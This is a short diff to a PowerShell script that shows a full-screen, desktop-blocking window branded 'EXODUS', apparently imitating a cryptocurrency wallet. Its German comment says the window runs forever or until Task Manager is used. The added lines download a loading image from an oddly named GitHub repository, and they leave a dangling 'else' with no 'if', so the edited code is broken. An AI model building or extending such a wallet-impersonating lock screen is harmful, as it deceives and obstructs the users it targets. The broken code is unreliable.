@@ -19,8 +19,12 @@ $pictureBox.Dock = "Top"
 $pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2
 
 
-if ($false) {
-} else {
+$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
+$webclient = New-Object System.Net.WebClient
+$bytes = $webclient.DownloadData($gifUrl)
+$stream = New-Object System.IO.MemoryStream($bytes)
+$pictureBox.Image = [System.Drawing.Image]::FromStream($stream)
+else {
     # Fallback: groÃŸes Exodus-Text-Logo
     $logoLabel = New-Object System.Windows.Forms.Label
     $logoLabel.Text = "EXODUS"
@@ -147,5 +151,6 @@ $timer.Start()
 # Blockiert alles – lÃ¤uft ewig oder bis Task-Manager
 
 $form.ShowDialog() | Out-Null
+
 
 
